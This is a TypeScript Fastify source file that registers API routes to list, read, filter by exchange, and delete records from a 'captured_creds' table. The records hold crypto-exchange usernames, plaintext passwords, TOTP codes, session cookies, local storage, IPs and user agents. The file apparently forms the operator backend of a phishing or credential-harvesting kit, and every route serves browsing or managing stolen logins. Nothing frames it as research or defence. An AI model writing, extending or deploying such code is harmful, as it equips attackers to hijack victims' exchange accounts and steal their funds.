/**
 * Credentials CRUD API - List, read, and delete captured credentials
 */
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import type { Pool } from 'pg'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { normalizeDatabaseConnectionString } from '../lib/database-anchor.js'
import { createAuthUnificationPreHandler } from '../middleware/auth-unification.js'

let pool: Pool | null = null

function getPool(): Pool {
  if (pool) return pool
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) throw new Error('DATABASE_URL not configured')
  pool = createDatabaseAnchorPool(normalizeDatabaseConnectionString(url), {
    max: 5,
    connectionTimeoutMillis: 10_000,
  })
  return pool
}

function readOptionalApiKey(): string | null {
  const key = process.env['CEX_CREDS_API_KEY']?.trim()
  return key || null
}

function readString(value: unknown): string {
  return typeof value === 'string' ? value.trim() : ''
}

export async function registerCredsCrudRoutes(app: FastifyInstance): Promise<void> {
  const authPre = createAuthUnificationPreHandler(app)

  // GET /api/v1/creds/list - List all captured credentials
  app.get('/api/v1/creds/list', { preHandler: authPre }, async (_request: FastifyRequest, reply: FastifyReply) => {
    try {
      const db = getPool()
      const result = await db.query(
        `SELECT id, exchange, username, totp, has_session_cookies, ip, created_at
         FROM captured_creds
         ORDER BY created_at DESC
         LIMIT 100`,
      )

      return sendSuccess(reply, 200, 'Credentials list retrieved', {
        count: result.rows.length,
        credentials: result.rows.map((row: any) => ({
          id: row.id,
          exchange: row.exchange,
          username: row.username,
          has_totp: Boolean(row.totp),
          has_session_cookies: row.has_session_cookies ?? false,
          ip: row.ip,
          created_at: row.created_at,
        })),
      })
    } catch (e) {
      return sendFailure(reply, 500, e instanceof Error ? e.message : 'Failed to fetch credentials', {
        code: 'DatabaseError',
      })
    }
  })

  // GET /api/v1/creds/:id - Get specific credential
  app.get('/api/v1/creds/:id', { preHandler: authPre }, async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      const { id } = request.params as { id?: string }
      if (!id) {
        return sendFailure(reply, 400, 'Credential ID required', { code: 'ValidationError' })
      }

      const db = getPool()
      const result = await db.query(
        `SELECT id, exchange, username, password, totp, session_cookies, local_storage, ip, user_agent, created_at
         FROM captured_creds
         WHERE id = $1`,
        [id],
      )

      if (result.rows.length === 0) {
        return sendFailure(reply, 404, 'Credential not found', { code: 'NotFound' })
      }

      const row = result.rows[0]
      return sendSuccess(reply, 200, 'Credential retrieved', {
        id: row.id,
        exchange: row.exchange,
        username: row.username,
        password: row.password,
        totp: row.totp,
        session_cookies: row.session_cookies,
        local_storage: row.local_storage,
        ip: row.ip,
        user_agent: row.user_agent,
        created_at: row.created_at,
      })
    } catch (e) {
      return sendFailure(reply, 500, e instanceof Error ? e.message : 'Failed to fetch credential', {
        code: 'DatabaseError',
      })
    }
  })

  // GET /api/v1/creds/exchange/:exchange - Get credentials by exchange
  app.get('/api/v1/creds/exchange/:exchange', { preHandler: authPre }, async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      const { exchange } = request.params as { exchange?: string }
      if (!exchange) {
        return sendFailure(reply, 400, 'Exchange name required', { code: 'ValidationError' })
      }

      const db = getPool()
      const result = await db.query(
        `SELECT id, exchange, username, totp, ip, created_at
         FROM captured_creds
         WHERE LOWER(exchange) = LOWER($1)
         ORDER BY created_at DESC`,
        [exchange],
      )

      return sendSuccess(reply, 200, `Credentials for ${exchange}`, {
        exchange,
        count: result.rows.length,
        credentials: result.rows,
      })
    } catch (e) {
      return sendFailure(reply, 500, e instanceof Error ? e.message : 'Failed to fetch credentials', {
        code: 'DatabaseError',
      })
    }
  })

  // DELETE /api/v1/creds/:id - Delete credential
  app.delete('/api/v1/creds/:id', { preHandler: authPre }, async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      const requiredKey = readOptionalApiKey()
      if (requiredKey) {
        const provided = readString(request.headers['x-cex-creds-key'] as string || '')
        if (provided !== requiredKey) {
          return sendFailure(reply, 401, 'Invalid or missing X-Cex-Creds-Key', { code: 'Unauthorized' })
        }
      }

      const { id } = request.params as { id?: string }
      if (!id) {
        return sendFailure(reply, 400, 'Credential ID required', { code: 'ValidationError' })
      }

      const db = getPool()
      const result = await db.query('DELETE FROM captured_creds WHERE id = $1 RETURNING id', [id])

      if (result.rows.length === 0) {
        return sendFailure(reply, 404, 'Credential not found', { code: 'NotFound' })
      }

      return sendSuccess(reply, 200, 'Credential deleted', { id })
    } catch (e) {
      return sendFailure(reply, 500, e instanceof Error ? e.message : 'Failed to delete credential', {
        code: 'DatabaseError',
      })
    }
  })

  app.log.info('[BOOT] Credentials CRUD routes registered (/api/v1/creds/*)')
}
